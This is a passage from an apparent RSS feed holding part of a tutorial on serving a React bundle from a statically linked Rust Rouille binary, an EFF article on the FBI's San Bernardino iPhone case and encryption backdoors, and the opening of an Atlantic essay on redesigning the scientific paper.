&lt;li&gt;&lt;strong&gt;Cross-platform native GUI apps:&lt;/strong&gt; One of the biggest challenges in creating a cross-platform GUI app is working with a GUI library that targets all the platforms you’re interested in. The approach here lets you leverage the user’s browser for this purpose. This is somewhat similar to what &lt;a href=&quot;https://electronjs.org/&quot;&gt;Electron&lt;/a&gt; accomplishes, but your backend is in Rust rather than JavaScript, and the user navigates to the app from their browser. There are certainly tradeoffs here, but it can work well for some apps. I was first introduced to this approach by &lt;a href=&quot;https://syncthing.net/&quot;&gt;syncthing&lt;/a&gt;, which is written in go but does a similar thing.&lt;/li&gt;
&lt;li&gt;Because I’ve been obsessed with static linking for as long as I can remember and I’m not really sure why.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We’re going to let cargo manage the project directory for us. Run the following commands:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cargo new --bin react_rust_webapp
cd react_rust_webapp
&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;First install React, Babel, and Webpack:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;mkdir ui
cd ui
npm init -y
npm install --save react react-dom
npm install --save-dev babel-core babel-loader babel-preset-env babel-preset-react webpack webpack-cli
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Then create the source files:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;mkdir dist
touch dist/index.html
mkdir src
touch src/index.js
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Put the following content in &lt;code&gt;dist/index.html&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!doctype html&amp;gt;
&amp;lt;html&amp;gt;
  &amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;Static React and Rust&amp;lt;/title&amp;gt;
  &amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;div id=&quot;root&quot;&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;script src=&quot;/bundle.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;And set &lt;code&gt;src/index.js&lt;/code&gt; to the following:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;import React from 'react';
import ReactDOM from 'react-dom';

ReactDOM.render(
  &amp;lt;h1&amp;gt;Hi there&amp;lt;/h1&amp;gt;,
  document.getElementById('root')
);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;We will also need a &lt;code&gt;.babelrc&lt;/code&gt; file:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-json&quot;&gt;{
  &quot;presets&quot;: [
    &quot;react&quot;,
    &quot;env&quot;,
  ],
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;And a &lt;code&gt;webpack.config.js&lt;/code&gt; file:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;const path = require('path');

module.exports = {
  entry: './src/index.js',
  output: {
    filename: 'bundle.js',
    path: path.resolve(__dirname, 'dist')
  },
  module: {
    rules: [
      {
        test: /\.(js|jsx)$/,
        exclude: /node_modules/,
        use: {
          loader: 'babel-loader',
        }
      }
    ]
  }
};
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;You should now be able to test that the frontend stuff is working. Run:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;npx webpack --mode development
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This will generate &lt;code&gt;dist/bundle.js&lt;/code&gt;. If you start a web server in the &lt;code&gt;dist&lt;/code&gt; directory you should be able to successfully serve the example content.&lt;/p&gt;
&lt;p&gt;Now for the Rust part.&lt;/p&gt;

&lt;p&gt;Move up to the &lt;code&gt;react_rust_webapp&lt;/code&gt; directory:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cd ..
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;First thing we need to do is install a web framework. I found &lt;a href=&quot;https://github.com/tomaka/rouille&quot;&gt;Rouille&lt;/a&gt; to be great for this simple example. I also really love &lt;a href=&quot;https://github.com/SergioBenitez/Rocket&quot;&gt;Rocket&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Add rouille to your Cargo.toml dependencies:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-toml&quot;&gt;[package]
name = &quot;react_rust_webapp&quot;
version = &quot;0.1.0&quot;

[dependencies]
rouille = &quot;2.1.0&quot;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Now modify &lt;code&gt;src/main.rs&lt;/code&gt; to have the following content:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;#[macro_use]
extern crate rouille;

use rouille::Response;

fn main() {
    let index = include_str!(&quot;../ui/dist/index.html&quot;);
    let bundle = include_str!(&quot;../ui/dist/bundle.js&quot;);
    rouille::start_server(&quot;0.0.0.0:5000&quot;, move |request| {

        let response = router!(request,
            (GET) [&quot;/&quot;] =&amp;gt; {
                Response::html(index)
            },
            (GET) [&quot;/bundle.js&quot;] =&amp;gt; {
                Response::text(bundle)
            },
            _ =&amp;gt; {
                Response::empty_404()
            }
        );

        response
    });
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;What is this doing?&lt;/p&gt;
&lt;p&gt;At compile time, &lt;code&gt;include_str!&lt;/code&gt; reads the indicated file and inserts the contents as a static string into the compiled binary. This string is then available as a normal variable.&lt;/p&gt;
&lt;p&gt;The rouille code just sets up two HTTP endpoints, “/” and “/bundle.js”. Instead of returning the files from the filesystem as we’d typically do with a web app, we’re returning the contents of the statics strings from the binary.&lt;/p&gt;
&lt;p&gt;To learn more about using Rouille to do more advanced stuff refer to their docs.&lt;/p&gt;

&lt;p&gt;Alright, now if all went well we should be able to run it. Make sure &lt;code&gt;ui/dist/bundle.js&lt;/code&gt; has already been generated as instructed above. Then run:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cargo run
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;It should start a server on port 5000. If you navigate to &lt;a href=&quot;http://localhost:5000&quot;&gt;http://localhost:5000&lt;/a&gt; in your browser you should see “Hi there”.&lt;/p&gt;

&lt;p&gt;This part can be skipped if you don’t need 100% static linking. Rust statically links most libraries by default anyway, except for things like libc.&lt;/p&gt;
&lt;p&gt;If you do want to proceed, you’ll first need to install &lt;a href=&quot;https://www.musl-libc.org/&quot;&gt;musl libc&lt;/a&gt; on your system and ensure the musl-gcc command is on your PATH.&lt;/p&gt;
&lt;p&gt;Then, rerun cargo as follows:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cargo run --target=x86_64-unknown-linux-musl
&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;For smaller binaries, build &lt;code&gt;bundle.js&lt;/code&gt; as follows (from with &lt;code&gt;ui/&lt;/code&gt;):&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;npx webpack --mode production
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;And run cargo as follows:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;cargo build --release --target=x86_64-unknown-linux-musl
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;You should end up with a statically linked binary in &lt;code&gt;react_rust_webapp/target/x86_64-unknown-linux-musl/release/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This is just the basics. There’s a lot more you could do with this, including:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Use &lt;code&gt;build.rs&lt;/code&gt; to automatically build the React app when you compile Rust.&lt;/li&gt;
&lt;li&gt;Take the port number from the command line&lt;/li&gt;
&lt;li&gt;Serialized (probably JSON) requests and responses&lt;/li&gt;
&lt;li&gt;Run webpack as an npm script command&lt;/li&gt;
&lt;li&gt;Target other OSes. I haven’t tried yet, but this should be mostly transferable to MacOS and Windows, thanks to the awesomeness that is Rust/Cargo and the universal availability of web browsers.&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Thu, 05 Apr 2018 14:09:54 +0000</pubDate>
<dc:creator>anderspitman</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://anderspitman.net/2018/04/04/static-react-rust-webapp/</dc:identifier>
</item>
<item>
<title>The FBI could have broken into San Bernadino shooter&amp;#039;s phone without Apple</title>
<link>https://www.eff.org/deeplinks/2018/04/fbi-could-have-gotten-san-bernardino-shooters-iphone-leadership-didnt-say</link>
<guid isPermaLink="true" >https://www.eff.org/deeplinks/2018/04/fbi-could-have-gotten-san-bernardino-shooters-iphone-leadership-didnt-say</guid>
<description>&lt;p&gt;&lt;span&gt;The Department of Justice’s Office of the Inspector General (OIG) last week &lt;a href=&quot;https://oig.justice.gov/reports/2018/o1803.pdf&quot;&gt;released a new report&lt;/a&gt; that supports what EFF has long suspected: that the FBI’s legal fight with Apple in 2016 to create backdoor access to a San Bernardino shooter’s iPhone was more focused on creating legal precedent than it was on accessing the one specific device.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;The report, called a “special inquiry,” details the FBI’s failure to be completely forthright with Congress, the courts, and the American public. While the OIG report concludes that neither former FBI Director James Comey, nor the FBI officials who submitted sworn statements in court had “testified inaccurately or made false statements” during the roughly month-long saga, it illustrates just how close they came to lying under oath.&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;From the onset, we suspected that the FBI’s primary goal in its effort to access to an &lt;a href=&quot;https://www.eff.org/cases/apple-challenges-fbi-all-writs-act-order&quot;&gt;iPhone found in the wake of the December 2015 mass shootings in San Bernardino&lt;/a&gt; wasn’t simply to unlock the device at issue. Rather, we believed that the FBI’s intention with the litigation was to obtain legal precedent that it could compel Apple to sabotage its own security mechanisms. Among other disturbing revelations, the new OIG report confirms our suspicion: senior leaders within the FBI were “definitely not happy” when the agency realized that another solution to access the contents of the phone had been found through an outside vendor and the legal proceeding against Apple couldn’t continue.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;By way of digging into the OIG report, let’s take a look at the timeline of events:&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;December 2, 2015: a shooting in San Bernardino results in the deaths of 14 people, including the two shooters. The shooters destroy their personal phones but leave a third phone—owned by their employer—untouched.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;February 9, 2016: Comey &lt;a href=&quot;https://www.intelligence.senate.gov/hearings/open-hearing-worldwide-threats-hearing&quot;&gt;testifies&lt;/a&gt; that the FBI cannot access the contents of the shooters’ remaining phone.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;February 16, 2016: the FBI applies for (and Magistrate Judge Pym grants the same day) an application for an &lt;a href=&quot;https://assets.documentcloud.org/documents/2714001/SB-Shooter-Order-Compelling-Apple-Asst-iPhone.pdf&quot;&gt;order&lt;/a&gt; compelling Apple to develop a new method to unlock the phone.&lt;/span&gt;&lt;span&gt;As part of that application, the FBI Supervisory Special Agent in charge of the investigation of the phone swears under oath that the FBI had “explored other means of obtaining [access] . . . and we have been unable to identify any other methods feasible for gaining access” other than compelling Apple to create a custom, &lt;a href=&quot;https://www.eff.org/deeplinks/2016/03/deep-dive-why-forcing-apple-write-and-sign-code-violates-first-amendment&quot;&gt;cryptographically signed&lt;/a&gt; version of iOS to bypass a key security feature and allow the FBI to access the device.&lt;/span&gt;&lt;span&gt;At the same time, according to the OIG report, the chief of the FBI’s Remote Operations Unit (the FBI’s elite hacking team, called ROU) knows “that one of the vendors that he worked closely with was almost 90 percent of the way toward a solution that the vendor had been working on for many months.”&lt;br/&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;Let’s briefly step out of the timeline to note the discrepancies between what the FBI was saying in early 2016 and what they actually knew. How is it that senior FBI officials testified that the agency had no capability to access the contents of the locked device when, the agency’s own premier hacking team knew capability was within reach? Because, according to the OIG report, FBI leadership doesn’t ask the ROU for its help until &lt;em&gt;after&lt;/em&gt; testifying that FBI’s techs knew of no way in.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;pull-quote&quot;&gt;&lt;span&gt;The OIG report concluded that Director Comey didn’t know that his testimony was false at the time he gave it. But it was false, and technical staff in FBI’s own ROU knew it was false.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Now, back to the timeline:&lt;/p&gt;
&lt;ul readability=&quot;-0.98180314309347&quot;&gt;&lt;li readability=&quot;0.98947368421053&quot;&gt;&lt;span&gt;March 1, 2016: Director Comey again &lt;a href=&quot;https://judiciary.house.gov/wp-content/uploads/2016/02/114-78_98899.pdf&quot;&gt;testifies&lt;/a&gt; that the FBI has been unable to access the contents of the phone without Apple’s help. Before the government applied for the All Writs Act order on February 11, Comey notes there were “a whole lot of conversations going on in that interim with companies, with other parts of the government, with other resources to figure out if there was a way to do it short of having to go to court.”&lt;/span&gt;&lt;span&gt;In response to a question from Rep. Daryl Issa whether Comey was “testifying today that you and/or contractors that you employ could not achieve this without demanding an unwilling partner do it,” Comey replies “Correct.”&lt;br/&gt;&lt;/span&gt;
&lt;p&gt;&lt;span&gt;&lt;br/&gt;The OIG report concluded that Director Comey didn’t know that his testimony was false at the time he gave it. But it was false, and technical staff in FBI’s own ROU knew it was false.&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;span&gt;March 16, 2016: An outside vendor for the FBI completes its work on an exploit for the model in question, building on the work that, as of February 16, the ROU knew to be 90% complete.&lt;br/&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;The head of the FBI’s Cryptologic and Electronics Analysis Unit (CEAU)—the unit whose initial inability to access the phone led to the FBI’s sworn statements that the Bureau knew of no method to do so—is pissed that others within FBI are even trying get into the phone without Apple’s help. In the words of the OIG report, “he expressed disappointment that the ROU Chief had engaged an outside vendor to assist with the Farook iPhone, asking the ROU Chief, ‘Why did you do that for?’”&lt;br/&gt;&lt;/span&gt;&lt;span&gt;&lt;br/&gt;Why is the CEAU Chief angry? Because it means that the legal battle is over and the FBI won’t be able to get the legal precedent against Apple that it was looking for. Again, the OIG report confirms our suspicions: “the CEAU Chief ‘was definitely not happy’ that the legal proceeding against Apple could no longer go forward” after the ROU’s vendor succeeded.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;March 20, 2016: The FBI’s outside vendor demonstrates the exploit for senior FBI leadership.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;March 21, 2016: &lt;u&gt;&lt;a href=&quot;https://www.eff.org/deeplinks/2016/03/win-now-court-postpones-hearing-apple-v-fbi&quot;&gt;On the eve of the scheduled hearing&lt;/a&gt;&lt;/u&gt;, the Department of Justice notifies the court in California, that, despite previous statements under oath that there were no “other methods feasible for gaining access,” they’ve now somehow found a way.&lt;br/&gt;&lt;/span&gt; &lt;span&gt;&lt;br/&gt;In response to the FBI’s eleventh-hour revelation, the court cancels the hearing and the legal battle between the FBI and Apple is over for now.&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;The OIG report comes on the heels of a &lt;a href=&quot;https://www.nytimes.com/2018/03/24/us/politics/unlock-phones-encryption.html&quot;&gt;report by the New York Times&lt;/a&gt; that the Department of Justice is renewing its &lt;a href=&quot;https://www.eff.org/deeplinks/2014/10/90s-and-now-fbi-and-its-inability-cope-encryption&quot;&gt;decades-long fight&lt;/a&gt; for anti-encryption legislation. According to the Times, DOJ officials are “convinced that mechanisms allowing access to [encrypted] data can be engineered without intolerably weakening the devices’ security against hacking.”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;That’s a bold claim, given that for years the consensus in the technical community has been exactly the opposite. In the 90’s, experts exposed serious flaws in proposed systems to give law enforcement access to encrypted data without compromising security, including the Clipper Chip. And, as the authors of the 2015 “&lt;a href=&quot;http://spar.isi.jhu.edu/~mgreen/paper-keys-under-doormats.pdf&quot;&gt;Keys Under Doormats&lt;/a&gt;” paper put it, “today’s more complex, global information infrastructure” presents “far more grave security risks” for these approaches.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;The Department’s blind faith in technologists’ ability to build a secure backdoor on encrypted phones is inspired by presentations by several security researchers as part of the recent &lt;a href=&quot;https://www.eff.org/deeplinks/2018/02/new-national-academy-sciences-report-encryption-asks-wrong-questions&quot;&gt;National Academy of Sciences (NAS) report on encryption&lt;/a&gt;. But the NAS &lt;a href=&quot;https://www.nap.edu/read/25010/chapter/1&quot;&gt;wrote&lt;/a&gt; that these proposals were not presented in “sufficient detail for a technical evaluation,” so they have yet to be rigorously tested by other security experts, let alone pass muster. Scientific and technical consensus is always open to challenge, but we—and the DOJ—should not abandon the longstanding view, backed by evidence, that deploying widespread special access mechanisms present insurmountable technical and practical challenges.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;The Times article also suggests that even as DOJ officials tout the possibility of secure backdoors, they’re simultaneously lowering the bar, arguing that a solution need not be “foolproof” if it allows the government to catch “ordinary, less-savvy criminals.” The problem with that statement is at least two-fold:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;First, according to the FBI, it is the savvy criminals (and terrorists) who present the biggest risk of using encryption to evade detection. By definition, less-savvy criminals will be easier for law enforcement to catch without guaranteed access to encrypted devices. Why is it acceptable to the FBI that the solutions they demand are necessarily incapable of stopping the very harms they claim they most need backdoors in order to stop?&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Second, the history in this area demonstrates that “not foolproof” often actually means “completely insecure.” That’s because any system that is designed to allow law enforcement agencies all across the country to expeditiously decrypt devices pursuant to court order will be enormously complex, raising the likelihood of serious flaws in implementation. And, regardless of who holds them, the keys used to decrypt these devices will need to be used frequently, making it even harder to defend them from bad actors. These and other technical challenges mean that the risks of actually deploying an imperfect exceptional access mechanism to millions of phones are unacceptably high. And of course, any system implemented in the US will be demanded by repressive governments around the world.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;The DOJ’s myopic focus on backdooring phones at the expense of the devices’ security is especially vexing in light of &lt;a href=&quot;https://motherboard.vice.com/en_us/article/kzxwwz/state-department-seemingly-buys-dollar15000-iphone-cracking-tech-graykey&quot;&gt;reports&lt;/a&gt; that law enforcement agencies are increasingly able to use commercial unlocking tools to break into essentially any device on the market. And if this is the status quo without mandated backdoor access and as vendors like Apple take steps to harden their devices against hacking, imagine how vulnerable devices could be with a legal mandate. The FBI likes to paint encryption in an apocalyptic light, suggesting that the technology drastically undermines the Bureau’s ability to do its job, but the evidence from the Apple fight and elsewhere is far less stark.&lt;/p&gt;
</description>
<pubDate>Thu, 05 Apr 2018 13:31:46 +0000</pubDate>
<dc:creator>grecy</dc:creator>
<og:type>article</og:type>
<og:title>The FBI Could Have Gotten Into the San Bernardino Shooter’s iPhone, But Leadership Didn’t Say That</og:title>
<og:url>https://www.eff.org/deeplinks/2018/04/fbi-could-have-gotten-san-bernardino-shooters-iphone-leadership-didnt-say</og:url>
<og:description>The Department of Justice’s Office of the Inspector General (OIG) last week released a new report that supports what EFF has long suspected: that the FBI’s legal fight with Apple in 2016 to create backdoor access to a San Bernardino shooter’s iPhone was more focused on creating legal precedent than...</og:description>
<og:image>https://www.eff.org/files/apple-v-fbi.png</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.eff.org/deeplinks/2018/04/fbi-could-have-gotten-san-bernardino-shooters-iphone-leadership-didnt-say</dc:identifier>
</item>
<item>
<title>Redesigning the Scientific Paper</title>
<link>https://www.theatlantic.com/science/archive/2018/04/the-scientific-paper-is-obsolete/556676/?single_page=true</link>
<guid isPermaLink="true" >https://www.theatlantic.com/science/archive/2018/04/the-scientific-paper-is-obsolete/556676/?single_page=true</guid>
<description>&lt;section id=&quot;article-section-1&quot;&gt;&lt;p class=&quot;dropcap&quot;&gt;T&lt;span class=&quot;smallcaps&quot;&gt;he scientific&lt;/span&gt; paper—the actual form of it—was one of the enabling inventions of modernity. Before it was developed in the 1600s, results were communicated privately in letters, ephemerally in lectures, or all at once in books. There was no public forum for &lt;em&gt;incremental&lt;/em&gt; advances. By making room for reports of single experiments or minor technical advances, journals made the chaos of science accretive. Scientists from that point forward became like the social insects: They made their progress steadily, as a buzzing mass.&lt;/p&gt;
&lt;p&gt;The earliest papers were in some ways more readable than papers are today. They were less specialized, more direct, shorter, and far less formal. Calculus had only just been invented. Entire data sets could fit in a table on a single page. What little “computation” contributed to the results was done by hand and could be verified in the same way.&lt;/p&gt;
&lt;p&gt;The more sophisticated science becomes, the harder it is to communicate results. Papers today are longer than ever and full of jargon and symbols. They depend on chains of computer programs that generate data, and clean up data, and plot data, and run statistical models on data. These programs tend to be both so sloppily written and so central to the results that it’s contributed to a replication crisis, or put another way, a failure of the paper to perform its most basic task: to report what you’ve actually discovered, clearly enough that someone else can discover it for themselves.&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-2&quot;&gt;&lt;p&gt;Perhaps the paper itself is to blame. Scientific methods evolve now at the speed of software; the skill most in demand among physicists, biologists, chemists, geologists, even anthropologists and research psychologists, is facility with programming languages and “data science” packages. And yet the basic means of communicating scientific results hasn’t changed for 400 years. Papers may be posted online, but they’re still text and pictures on a page.&lt;/p&gt;
&lt;p&gt;What would you get if you designed the scientific paper from scratch today? A little while ago I spoke to &lt;a href=&quot;https://www.theatlantic.com/technology/archive/2017/09/saving-the-world-from-code/540393/&quot; data-omni-click=&quot;r'article',r'',d,r'intext',r'0',r'556676'&quot;&gt;Bret Victor&lt;/a&gt;, a researcher who worked at Apple on early user-interface prototypes for the iPad and now runs his own lab in Oakland, California, that studies the future of computing. Victor has long been convinced that scientists haven’t yet taken full advantage of the computer. “It’s not that different than looking at the printing press, and the evolution of the book,” he said. After Gutenberg, the printing press was mostly used to mimic the calligraphy in bibles. It took nearly 100 years of technical and conceptual improvements to invent the modern book. “There was this entire period where they had the new technology of printing, but they were just using it to emulate the old media.”&lt;/p&gt;
&lt;p&gt;Victor gestured at what might be possible when he &lt;a href=&quot;http://worrydream.com/ScientificCommunicationAsSequentialArt/&quot; data-omni-click=&quot;r'article',r'',d,r'intext',r'1',r'556676'&quot;&gt;redesigned&lt;/a&gt; a journal article by Duncan Watts and Steven Strogatz, “Collective dynamics of ‘small-world’ networks.” He chose it both because it’s one of the most highly cited papers in all of science and because it’s a model of clear exposition. (Strogatz is best known for writing the beloved “Elements of Math” column for &lt;em&gt;The New York Times&lt;/em&gt;.)&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-3&quot;&gt;&lt;p&gt;The Watts-Strogatz paper described its key findings the way most papers do, with text, pictures, and mathematical symbols. And like most papers, these findings were still hard to swallow, despite the lucid prose. The hardest parts were the ones that described procedures or algorithms, because these required the reader to “play computer” in their head, as Victor put it, that is, to strain to maintain a fragile mental picture of what was happening with each step of the algorithm.&lt;/p&gt;
&lt;p&gt;Victor’s redesign interleaved the explanatory text with little interactive diagrams that illustrated each step. In his version, you could &lt;em&gt;see&lt;/em&gt; the algorithm at work on an example. You could even control it yourself.&lt;/p&gt;
&lt;img alt=&quot;&quot; data-srcset=&quot;https://cdn.theatlantic.com/assets/media/img/posts/2018/03/image_1/7554b69ab.png&quot; class=&quot;lazyload&quot;/&gt;&lt;a href=&quot;http://worrydream.com/ScientificCommunicationAsSequentialArt/&quot; data-omni-click=&quot;r'article',r'',d,r'intext',r'2',r'556676'&quot;&gt;Bret Victor&lt;/a&gt;
&lt;p&gt;Strogatz admired Victor’s design. He later told me that it was a shame that in mathematics it’s been a tradition for hundreds of years to make papers as formal and austere as possible, often suppressing the very visual aids that mathematicians use to make their discoveries.&lt;/p&gt;
&lt;p&gt;Strogatz studies nonlinear dynamics and chaos, systems that get into sync or self-organize: fireflies flashing, metronomes ticking, heart cells firing electrical impulses. The key is that these systems go through cycles, which Strogatz visualizes as dots running around circles: When a dot comes back to the place where it started—that’s a firefly flashing or a heart cell firing. “For about 25 years now I’ve been making little computer animations of dots running around circles, with colors indicating their frequency,” he said. “The red are the slow guys, the purple are the fast guys ... I have these colored dots swirling around on my computer. I do this all day long,” he said. “I can see patterns much more readily in colored dots running, moving on the screen than I can in looking at 500 simultaneous time series. I don’t &lt;em&gt;see&lt;/em&gt; stuff very well like that. Because it’s not what it really looks like ... What I’m studying is something dynamic. So the representation should be dynamic.”&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-4&quot;&gt;&lt;p&gt;Software is a dynamic medium; paper isn’t. When you think in those terms it does seem strange that research like Strogatz’s, the study of dynamical systems, is so often being shared on paper, without the benefit of his little swirling dots—because it’s the swirling dots that helped him to see what he saw, and that might help the reader see it too.&lt;/p&gt;
&lt;p&gt;This is, of course, the whole problem of scientific communication in a nutshell: Scientific results today are as often as not found with the help of computers. That’s because the ideas are complex, dynamic, hard to grab ahold of in your mind’s eye. And yet by far the most popular tool we have for communicating these results is the PDF—literally a simulation of a piece of paper. Maybe we can do better.&lt;/p&gt;
&lt;hr class=&quot;c-section-divider&quot;/&gt;&lt;p class=&quot;dropcap&quot;&gt;S&lt;span class=&quot;smallcaps&quot;&gt;tephen Wolfram&lt;/span&gt; published his first scientific paper when he was 15. He had published 10 when he finished his undergraduate career, and by the time he was 20, in 1980, he’d finished his Ph.D. in particle physics from the California Institute of Technology. His secret weapon was his embrace of the computer at a time when most serious scientists thought computational work was beneath them. “By that point, I think I was the world’s largest user of computer algebra,” he said in a talk. “It was so neat, because I could just compute all this stuff so easily. I used to have fun putting incredibly ornate formulas in my physics papers.”&lt;/p&gt;
&lt;p&gt;As his research grew more ambitious, he found himself pushing existing software to its limit. He’d have to use half a dozen programming tools in the course of a single project. “A lot of my time was spent gluing all this stuff together,” he said. “What I decided was that I should try to build a single system that would just do all the stuff I wanted to do—and that I could expect to keep growing forever.” Instead of continuing as an academic, Wolfram decided to start a company, Wolfram Research, to build the perfect computing environment for scientists. A headline in the April 18, 1988, edition of &lt;em&gt;Forbes&lt;/em&gt; pronounced: “Physics Whiz Goes Into Biz.”&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-5&quot;&gt;&lt;p&gt;At the heart of Mathematica, as the company’s flagship product became known, is a “notebook” where you type commands on one line and see the results on the next. Type “1/6 + 2/5” and it’ll give you “17/30.” Ask it to factor a polynomial and it will comply. Mathematica can do calculus, number theory, geometry, algebra. But it also has functions that can calculate how chemicals will react, or filter genomic data. It has in its knowledge base nearly every painting in Rembrandt’s &lt;em&gt;oeuvre&lt;/em&gt; and can give you a scatterplot of his color palette over time. It has a model of orbital mechanics built in and can tell you how far an F/A-18 Hornet will glide if its engines cut out at 32,000 feet. A Mathematica notebook is less a record of the user’s calculations than a transcript of their conversation with a polymathic oracle. Wolfram calls carefully authored Mathematica notebooks “computational essays.”&lt;/p&gt;
&lt;p&gt;The notebook interface was the brainchild of Theodore Gray, who was inspired while working with an old Apple code editor. Where most programming environments either had you run code one line at a time, or all at once as a big blob, the Apple editor let you highlight any part of your code and run just that part. Gray brought the same basic concept to Mathematica, with help refining the design from none other than Steve Jobs. The notebook is designed to turn scientific programming into an interactive exercise, where individual commands were tweaked and rerun, perhaps dozens or hundreds of times, as the author learned from the results of their little computational experiments, and came to a more intimate understanding of their data.&lt;/p&gt;
&lt;p&gt;What made Mathematica’s notebook especially suited to the task was its ability to generate plots, pictures, and beautiful mathematical formulas, and to have this output respond dynamically to changes in the code. In Mathematica you can input a voice recording, run complex mathematical filters over the audio, and visualize the resulting sound wave; just by mousing through and adjusting parameters, you can warp the wave, discovering which filters work best by playing around. Mathematica’s ability to fluidly handle so many different kinds of computation in a single, simple interface is the result, Gray says, of “literally man-centuries of work.”&lt;/p&gt;
&lt;p&gt;The vision driving that work, reiterated like gospel by Wolfram in his many lectures, blog posts, screencasts, and press releases, is not merely to make a good piece of software, but to create an inflection point in the enterprise of science itself. In the mid-1600s, Gottfried Leibniz devised a notation for integrals and derivatives (the familiar ∫ and dx/dt) that made difficult ideas in calculus almost mechanical. Leibniz developed the sense that a similar notation applied more broadly could create an “algebra of thought.” Since then, logicians and linguists have lusted after a universal language that would eliminate ambiguity and turn complex problem-solving of all kinds into a kind of calculus.&lt;/p&gt;
&lt;/section&gt;
&lt;section id=&quot;article-section-6&quot;&gt;&lt;p&gt;Wolfram’s career has been an ongoing effort to vacuum up the world’s knowledge into Mathematica, and later, to make it accessible via Wolfram Alpha, the company’s “computational knowledge engine” that powers many of Siri and Alexa's question-answering abilities. It is Wolfram’s own attempt to create an Interlingua, a programming language equally understandable by humans and machines, an algebra of everything.&lt;/p&gt;
&lt;p&gt;It is a characteristically grandiose ambition. In the 1990s, Wolfram would occasionally tease in public comments that at the same time he was building his company, he was quietly working on a revolutionary science project, years in the making. Anticipation built. And then, finally, the thing itself arrived: a gargantuan book, about as wide as a cinder block and nearly as heavy, with a title for the ages—&lt;em&gt;A New Kind of Science&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;It turned out to be a detailed study, carried out in Mathematica notebooks, of the surprisingly complex patterns generated by simple computational processes—called cellular automata—both for their own sake and as a way of understanding how simple rules can give rise to complex phenomena in nature, like a tornado or the pattern on a mollusk shell. These explorations, which Wolfram published without peer review, came bundled with reminders, every few pages, about how important they were.&lt;/p&gt;
